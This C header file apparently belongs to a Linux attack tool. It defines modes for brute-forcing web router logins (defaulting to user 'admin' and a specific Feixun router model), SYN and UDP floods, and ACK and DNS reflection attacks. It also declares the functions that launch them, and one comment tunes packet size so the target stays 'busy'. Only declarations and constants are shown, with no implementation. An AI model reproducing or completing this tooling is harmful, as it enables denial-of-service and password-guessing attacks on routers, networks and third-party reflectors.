#ifndef _MAIN_H
#define _MAIN_H

#define BRUTE_FORCE_ATTACK 1    // guess the web passwd (advanced)
#define SYN_FLOOD_ATTACK 2      // syn flood attack
#define UDP_FLOOD_ATTACK 3      // udp flood attack
#define ACK_REFLECT_ATTACK 4    // ack reflect attack
#define DNS_REFLECT_ATTACK 5    // dns reflect attack

#define BRUTE_FORCE_US_PF 1    // username specified (user input or default value) and password from file
#define BRUTE_FORCE_US_PR 2    // username specified (user input or defalut value) and password from random
#define BRUTE_FORCE_US_PS 3    // username specified and password also specified
#define BRUTE_FORCE_UF_PS 4    // username from file and password specified
#define BRUTE_FORCE_UF_PF 5    // the username and password both from file 

#define ADDRESS_TYPE_IP 1
#define ADDRESS_TYPE_HTTP 2
#define ADDRESS_TYPE_HTTPS 3

#define NO_ENCRYPT 0
#define BASE64_ENCRYPT 1

#define MAX_USERNAME_LENGTH 16
#define MAX_PASSWORD_LENGTH 16
#define MAX_USERNAME_FILE_PATH_LENGTH 100
#define MAX_PASSWORD_FILE_PATH_LENGTH 100
#define MAX_ADDRESS_LENGTH 2048              // URL standard
#define MAX_IP_LENGTH 16                     // 255.255.255.255
#define MAX_HOSTNAME_LENGTH 2048
#define MAX_ROUTER_TYPE_LENGTH 100

/* use in brute force attack */
#define MAX_REQUEST_LENGTH 2048
#define MAX_REQUEST_POST_DATA_LENGTH 128
#define MAX_RESPONSE_LENGTH 2048

#define MAX_HTTP_SEND_DATA_SIZE 2048
#define MAX_HTTP_RECV_DATA_SIZE 2048

#define MAX_PROTOCOL_LENGTH 10               // http https
#define MAX_PORT_LENGTH 6                   // 65535

#define ENABLE 1
#define DISABLE 0

#define TRUE 1
#define FALSE 0

#define NORMAL_STR_LIST_MODE 0
#define REPEAT_STR_LIST_MODE 1
#define RANDOM_STR_LIST_MODE 2

#define USERNAME_STR_LIST 0
#define PASSWORD_STR_LIST 1

#define PROCESS_NUM_DEFAULT 1
#define THREAD_NUM_DEFAULT 4

#define USERNAME_DEFAULT "admin"

#define USERNAME_FILE_PATH_DEFAULT "/etc/dos-tool-linux-username.txt"
#define PASSWORD_FILE_PATH_DEFAULT "/etc/dos-tool-linux-password.txt"
#define RECV_TIME_OUT 60 //s
#define ROUTER_TYPE_DEFAULT "feixun_fwr_604h"
#define HTTP_PORT_DEFAULT 80
#define HTTPS_PORT_DEFAULT 443

#define BRUTE_FORCE_ATTACK_RESPONSE_WRITE_PATH "./guess-response.log"


/* need re-think here */
#define ACK_IP_LIST_NAME "./core_module/ack_reflect_ip_list.txt"
#define DNS_IP_LIST_NAME "./core_module/dns_reflect_ip_list.txt"

#define DNS_QUERY_NAME_DEFAULT "github.com"                           // if you want to change this name, please also edit the dns query->name size

// for UDP padding size
// make sure the size is very small
// same traffic will send more packages that make the target busy
#define PADDING_SIZE 1

typedef struct udp_struct
{
    char *src_ip;
    char *dst_ip;
    size_t src_port;
    size_t dst_port;
    size_t each_ip_repeat;
} UDPStruct, *pUDPStruct;

// defined by str.h


typedef struct str_node
{
    struct str_node *next;
    int label; // if label == 0, this node's value is not used
    char *str;
} StrNode, *pStrNode;

typedef struct str_header
{
    struct str_node *next;
    size_t length;

    /* NORMAL_STR_LIST_MODE: get the str from the file
     *                       and put it into a list
     * REPEAT_STR_LIST_MODE: repeat one str in user
     * RANDOM_STR_LIST_MODE: specify this str should
     *                       be random string
     */
    int str_list_mode;

    /* USERNAME_STR_LIST: this string list store the username
     * PASSWORD_STR_LIST: this string list store the password
     */
    int str_list_type;
    struct str_node *cursor; // this pointer will point to the next not used value
} StrHeader, *pStrHeader;


typedef struct ip_list_thread
{
    struct ip_list_thread *next;
    pStrHeader list;
} IPList_Thread, *pIPList_Thread;

typedef struct pseudo_header
{
    // Needed for checksum calculation
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
} PseudoHeader;

typedef struct syn_flood_st
{
    char *src_ip;
    char *dst_ip;
    size_t src_port;
    size_t dst_port;
} SynFloodSt, *pSynFloodSt;

typedef struct brute_force_st
{
    /* if not use the path file, set all NULL */
    int id;
    /* 0: normal mode struct */
    /* 1: special mode struct */
    /* 2: fill the str_node in thread program run (random password use)*/ 
    int brute_force_attack_mode;
    struct str_header *username_list_header;
    struct str_header *password_list_header;
} BruteForceSt, *pBruteForceSt;

typedef struct parameter
{
    int attack_mode;
    int random_saddr;

    long int thread_num;
    long int passwd_len;
    long int ip_repeat_time;
    /* if 0, ip address */
    /* if 1, http url address */
    /* if 2, https url address */
    int address_type;

    /* for brute force atack user */
    int password_encrypt_type;
    int username_encrypt_type;

    char *target_address;
    int target_port;
    char *username;
    char *password;
    char *username_file_path;
    char *password_file_path;
    char *router_type;

    /* field in the thread program */
    int seed;
    pBruteForceSt _brute_force_st;
    pSynFloodSt _syn_flood_st;
} Parameter, *pParameter;

/* from logger.c */
extern int ShowMessage(const int message_debug_mode, const int user_debug_mode, const char *fmt, ...);

extern int InfoMessage(const char *fmt, ...);
extern int WarningMessage(const char *fmt, ...);
extern int ErrorMessage(const char *fmt, ...);

extern int MallocErrorMessage(void);
extern int InvalidParameterErrorMessage(const char *argv_s);

extern int BruteForceAttackResponseWrite(const char *response);

/* from tools.c */
extern int AnalysisAddress(const char *addr);
extern char *StripCopy(char *dst, const char *src);

extern void DesBruteForceStrList(pStrHeader list_header);
extern int GenBruteForceUsernameList(const char *file_path, pStrHeader *username_list_header, const int len);
extern int GenBruteForcePasswordList(const char *file_path, pStrHeader *password_list_header, const int len);
extern int GenBruteForceRepeatUsernameList(const char *str, pStrHeader *username_list_header);
extern int GenBruteForceRepeatPasswordList(const char *str, pStrHeader *password_list_header);

extern char *GenRandomPassword(char **result, const unsigned int seed, const int len);

/* from https.c */
extern int HttpMethod(const char *address, const int port, const char *request, char **response);
extern int HttpsMethod(const char *address, const int port, const char *request, char **response);


/* from parameter */
extern int GenParameterSt(const int argc, char *argv[], pParameter *parameter);
extern void DesParameterSt(pParameter parameter);
extern int BruteForceMode(pParameter parameter);

/* usage.c */
extern void ShowUsage(void);

/* from crypto.h */
extern char *Base64Encode(const char *plain_text);
extern unsigned char *Base64Decode(const char *cipher_text);

/* attack function */
extern int StartBruteForceAttack(pParameter parameter);
extern int StartSYNFloodAttack(pParameter parameter);
extern int StartUDPFloodAttack(pParameter parameter);
extern int StartACKReflectAttack(pParameter parameter);
extern int StartDNSReflectAttack(pParameter parameter);

#endif